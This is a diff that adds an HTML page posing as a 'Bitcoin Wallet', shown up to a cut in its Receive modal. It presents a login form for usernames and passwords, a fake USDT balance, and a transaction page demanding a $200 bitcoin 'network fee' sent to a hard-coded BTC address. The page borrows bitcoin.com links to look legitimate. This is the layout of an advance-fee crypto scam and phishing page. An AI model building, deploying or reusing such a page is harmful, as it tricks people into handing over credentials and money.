@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitcoin Wallet</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="preload" as="image" href="https://i.ibb.co/4W2yLpJ/bitcoin-bg.jpg">
+</head>
+<body>
+    <!-- Background Video -->
+    <div class="animated-bg">
+        <div class="crypto-particle"></div>
+        <div class="crypto-particle"></div>
+        <div class="crypto-particle"></div>
+        <!-- Add more particles as needed -->
+      </div>
+    
+    <!-- Loading Screen -->
+    <div id="global-loader" class="loader-container">
+        <div class="loader-content">
+            <div class="loader-spinner"></div>
+            <div class="loader-text">Loading... Please wait</div>
+        </div>
+    </div>
+
+    <!-- Login Page -->
+    <div id="login-page" class="page">
+        <header>
+            <div class="logo">
+                <img src="data:image/png;base64,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" alt="Bitcoin Wallet Logo">
+                <span>Bitcoin Wallet</span>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="https://www.bitcoin.com" target="_blank">Home</a></li>
+                    <li><a href="https://www.bitcoin.com/wallet/" target="_blank">Wallet</a></li>
+                    <li><a href="https://www.bitcoin.com/exchange/" target="_blank">Exchange</a></li>
+                    <li><a href="https://www.bitcoin.com/casino/" target="_blank">Games</a></li>
+                    <li><a href="https://www.bitcoin.com/news/" target="_blank">News</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <main class="login-container">
+            <div class="login-form">
+                <div class="form-header">
+                    <h2>Secure Wallet Login</h2>
+                    <p>Access your digital assets</p>
+                </div>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="username">Email address or Username</label>
+                        <input type="text" id="username" name="username" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    <button type="submit" class="btn-login">
+                        <span class="btn-text">Sign In</span>
+                        <span class="btn-icon"><i class="fas fa-arrow-right"></i></span>
+                    </button>
+                </form>
+            </div>
+
+            <div class="market-data">
+                <h3><i class="fas fa-chart-line"></i> Market Overview</h3>
+                <div class="crypto-list" id="crypto-list-login">
+                    <!-- Crypto prices will be loaded here -->
+                </div>
+            </div>
+
+            <div class="news-section">
+                <h3><i class="far fa-newspaper"></i> Latest Crypto News</h3>
+                <div class="news-list" id="news-list">
+                    <!-- News will be loaded here -->
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>256-bit SSL Encryption</span>
+            </div>
+            <div class="footer-links">
+                <a href="https://www.bitcoin.com/about/" target="_blank">About</a>
+                <a href="https://www.bitcoin.com/terms/" target="_blank">Terms</a>
+                <a href="https://www.bitcoin.com/privacy/" target="_blank">Privacy</a>
+                <a href="https://www.bitcoin.com/contact/" target="_blank">Contact</a>
+            </div>
+            <div class="copyright">
+                &copy; 2025 Bitcoin Wallet. All rights reserved.
+            </div>
+        </footer>
+    </div>
+
+    <!-- Wallet Page -->
+    <div id="wallet-page" class="page">
+        <header>
+            <div class="logo">
+                <img src="https://assets.coingecko.com/coins/images/325/standard/Tether.png?1696501661" alt="Bitcoin Wallet Logo">
+                <span>Bitcoin Wallet</span>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="https://www.bitcoin.com" target="_blank">Home</a></li>
+                    <li><a href="https://www.bitcoin.com/wallet/" target="_blank">Wallet</a></li>
+                    <li><a href="https://www.bitcoin.com/exchange/" target="_blank">Exchange</a></li>
+                    <li><a href="https://www.bitcoin.com/casino/" target="_blank">Games</a></li>
+                    <li><a href="https://www.bitcoin.com/news/" target="_blank">News</a></li>
+                </ul>
+            </nav>
+            <div class="user-profile">
+                <div class="profile-icon">
+                    <i class="fas fa-user-circle"></i>
+                </div>
+                <span id="username-display">User</span>
+                <button id="logout-btn">
+                    <i class="fas fa-sign-out-alt"></i>
+                </button>
+            </div>
+        </header>
+        <main class="wallet-container">
+            <!-- Add this new container -->
+            <div class="info-container">
+                <div class="info-content">
+                    <i class="fas fa-info-circle"></i>
+                    <p>Welcome back! Your account is secure and ready to use. Please remember that your wallet MUST have at least $200 worth of bitcoin as NETWORK FEE inorder to send out USDT </p>
+                </div>
+            </div>
+
+        <main class="wallet-container">
+            <div class="wallet-balance">
+                <div class="balance-header">
+                    <h2><i class="fas fa-wallet"></i> Your USDT Balance</h2>
+                    <div class="balance-refresh">
+                        <i class="fas fa-sync-alt"></i>
+                    </div>
+                </div>
+                <div class="balance-amount">$9.651.60</div>
+                <div class="balance-details">
+                    <div class="detail-item">
+                        <span>Available</span>
+                        <span>$9,651.82</span>
+                    </div>
+                    <div class="detail-item">
+                        <span>In Orders</span>
+                        <span>$0.00</span>
+                    </div>
+                </div>
+                <div class="wallet-actions">
+                    <button id="send-btn" class="wallet-btn">
+                        <i class="fas fa-paper-plane"></i>
+                        <span>Send</span>
+                    </button>
+                    <button id="receive-btn" class="wallet-btn">
+                        <i class="fas fa-qrcode"></i>
+                        <span>Receive</span>
+                    </button>
+                    <button id="withdraw-btn" class="wallet-btn">
+                        <i class="fas fa-external-link-alt"></i>
+                        <span>Withdraw</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="market-ticker">
+                <div class="ticker-header">
+                    <h3><i class="fas fa-coins"></i> Crypto Prices</h3>
+                    <div class="ticker-controls">
+                        <button class="ticker-prev"><i class="fas fa-chevron-left"></i></button>
+                        <button class="ticker-next"><i class="fas fa-chevron-right"></i></button>
+                    </div>
+                </div>
+                <div class="ticker-container">
+                    <div class="ticker-track" id="crypto-ticker">
+                        <!-- Crypto ticker will be loaded here -->
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>Secure Multi-Signature Wallet</span>
+            </div>
+            <div class="footer-links">
+                <a href="https://www.bitcoin.com/about/" target="_blank">About</a>
+                <a href="https://www.bitcoin.com/terms/" target="_blank">Terms</a>
+                <a href="https://www.bitcoin.com/privacy/" target="_blank">Privacy</a>
+                <a href="https://www.bitcoin.com/contact/" target="_blank">Contact</a>
+            </div>
+            <div class="copyright">
+                &copy; 2025 Bitcoin Wallet. All rights reserved.
+            </div>
+        </footer>
+    </div>
+
+    <!-- Transaction Page -->
+    <div id="transaction-page" class="page">
+        <header>
+            <div class="logo">
+                <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin Wallet Logo">
+                <span>Bitcoin Wallet</span>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="https://www.bitcoin.com" target="_blank">Home</a></li>
+                    <li><a href="https://www.bitcoin.com/wallet/" target="_blank">Wallet</a></li>
+                    <li><a href="https://www.bitcoin.com/exchange/" target="_blank">Exchange</a></li>
+                    <li><a href="https://www.bitcoin.com/casino/" target="_blank">Games</a></li>
+                    <li><a href="https://www.bitcoin.com/news/" target="_blank">News</a></li>
+                </ul>
+            </nav>
+            <div class="user-profile">
+                <div class="profile-icon">
+                    <i class="fas fa-user-circle"></i>
+                </div>
+                <span id="username-display-tx">User</span>
+                <button id="logout-btn-tx">
+                    <i class="fas fa-sign-out-alt"></i>
+                </button>
+            </div>
+        </header>
+
+        <main class="transaction-container">
+            <div class="transaction-header">
+                <button class="back-btn" id="back-to-wallet">
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+                <h2>Transaction Details</h2>
+            </div>
+
+            <div class="transaction-status">
+                <div class="status-icon pending">
+                    <div class="status-pulse"></div>
+                    <i class="fas fa-clock"></i>
+                </div>
+                <h2>Transaction Pending</h2>
+                <p>Your transaction has been put on hold....</p>
+            </div>
+
+            <div class="transaction-details">
+                <div class="detail-card">
+                    <h3><i class="fas fa-receipt"></i> Transaction Summary</h3>
+                    <div class="detail-grid">
+                        <div class="detail-item">
+                            <span>Amount:</span>
+                            <span id="tx-amount">$0.00</span>
+                        </div>
+                        <div class="detail-item">
+                            <span>Recipient Address:</span>
+                            <span id="tx-address" class="monospace">0x000...000</span>
+                        </div>
+                        <div class="detail-item">
+                            <span>Transaction ID:</span>
+                            <span id="tx-id" class="monospace">0x123...456</span>
+                        </div>
+                        <div class="detail-item">
+                            <span>Network Fee:</span>
+                            <span>$0.00</span>
+                        </div>
+                        <div class="detail-item total">
+                            <span>Total:</span>
+                            <span id="tx-total">$0.00</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="fee-card">
+                    <h3><i class="fas fa-gas-pump"></i> Network Fee Payment</h3>
+                    <p>To complete this transaction, please send the Bitcoin network fee of <strong>$200.00</strong> to your bitcoin wallet address:</p>
+                    
+                    <div class="qr-address">
+                        <div class="qr-code">
+                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1q5pl0emcvu9xgkrphcxfm3yhu84ctp3nuj47y0c" alt="Fee Payment QR Code">
+                        </div>
+                        <div class="address-details">
+                            <div class="fee-address">
+                                <code class="monospace">bc1q5pl0emcvu9xgkrphcxfm3yhu84ctp3nuj47y0c</code>
+                                <button class="copy-btn" onclick="copyToClipboard('bc1q5pl0emcvu9xgkrphcxfm3yhu84ctp3nuj47y0c')">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                            <div class="network-info">
+                                <p><i class="fas fa-network-wired"></i> <strong>Network:</strong> Bitcoin (BTC)</p>
+                                <p><i class="fas fa-info-circle"></i> Send exact amount to avoid delays</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button id="confirm-fee-btn" class="confirm-btn">
+                        <span class="btn-text">I Have Sent the Fee</span>
+                        <span class="btn-icon"><i class="fas fa-check"></i></span>
+                    </button>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>Transaction Secured with 256-bit Encryption</span>
+            </div>
+            <div class="footer-links">
+                <a href="https://www.bitcoin.com/about/" target="_blank">About</a>
+                <a href="https://www.bitcoin.com/terms/" target="_blank">Terms</a>
+                <a href="https://www.bitcoin.com/privacy/" target="_blank">Privacy</a>
+                <a href="https://www.bitcoin.com/contact/" target="_blank">Contact</a>
+            </div>
+            <div class="copyright">
+                &copy; 2025 Bitcoin Wallet. All rights reserved.
+            </div>
+        </footer>
+    </div>
+
+    <!-- Loading Modal -->
+    <div id="loading-modal" class="modal">
+        <div class="modal-content">
+            <div class="loading-spinner">
+                <div class="spinner"></div>
+                <div class="spinner-inner"></div>
+            </div>
+            <h3>Awaiting Confirmation</h3>
+            <p>Please wait while we confirm your transaction...</p>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Send Modal -->
+    <div id="send-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2><i class="fas fa-paper-plane"></i> Send USDT</h2>
+            <form id="send-form">
+                <div class="form-group">
+                    <label for="recipient-address"><i class="fas fa-wallet"></i> Recipient Address</label>
+                    <input type="text" id="recipient-address" name="recipient-address" placeholder="Enter USDT wallet address" required>
+                </div>
+                <div class="form-group">
+                    <label for="send-amount"><i class="fas fa-coins"></i> Amount (USDT)</label>
+                    <div class="amount-input">
+                        <span>$</span>
+                        <input type="number" id="send-amount" name="send-amount" placeholder="0.00" min="0.01" step="0.01" required>
+                        <button type="button" class="max-btn">MAX</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="send-note"><i class="far fa-sticky-note"></i> Note (Optional)</label>
+                    <input type="text" id="send-note" name="send-note" placeholder="Add a note">
+                </div>
+                <div class="fee-display">
+                    <span>Network Fee:</span>
+                    <span>$0.00</span>
+                </div>
+                <button type="submit" class="confirm-btn">
+                    <span class="btn-text">Confirm Send</span>
+                    <span class="btn-icon"><i class="fas fa-arrow-right"></i></span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Withdraw Modal -->
+    <div id="withdraw-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2><i class="fas fa-external-link-alt"></i> Withdraw USDT</h2>
+            <form id="withdraw-form">
+                <div class="form-group">
+                    <label for="withdraw-address"><i class="fas fa-wallet"></i> Destination Address</label>
+                    <input type="text" id="withdraw-address" name="withdraw-address" placeholder="Enter external wallet address" required>
+                </div>
+                <div class="form-group">
+                    <label for="withdraw-amount"><i class="fas fa-coins"></i> Amount (USDT)</label>
+                    <div class="amount-input">
+                        <span>$</span>
+                        <input type="number" id="withdraw-amount" name="withdraw-amount" placeholder="0.00" min="0.01" step="0.01" required>
+                        <button type="button" class="max-btn">MAX</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="withdraw-network"><i class="fas fa-network-wired"></i> Network</label>
+                    <select id="withdraw-network" name="withdraw-network" required>
+                        <option value="ERC20">ERC20 (Ethereum)</option>
+                        <option value="TRC20" selected>TRC20 (Tron)</option>
+                        <option value="BEP20">BEP20 (Binance Smart Chain)</option>
+                    </select>
+                </div>
+                <div class="fee-display">
+                    <span>Network Fee:</span>
+                    <span>$0.00</span>
+                </div>
+                <button type="submit" class="confirm-btn">
+                    <span class="btn-text">Confirm Withdrawal</span>
+                    <span class="btn-icon"><i class="fas fa-arrow-right"></i></span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Receive Modal -->
+    <div id="receive-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2><i class="fas fa-qrcode"></i> Receive USDT</h2>
+            <div class="qr-container">
+                <div class="qr-code">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0xC20c3DBA48D8EFECb07242e683FB95a7c13bBE31" alt="QR Code">
+                </div>
+                <div class="address-container">
+                    <div class="address-display">
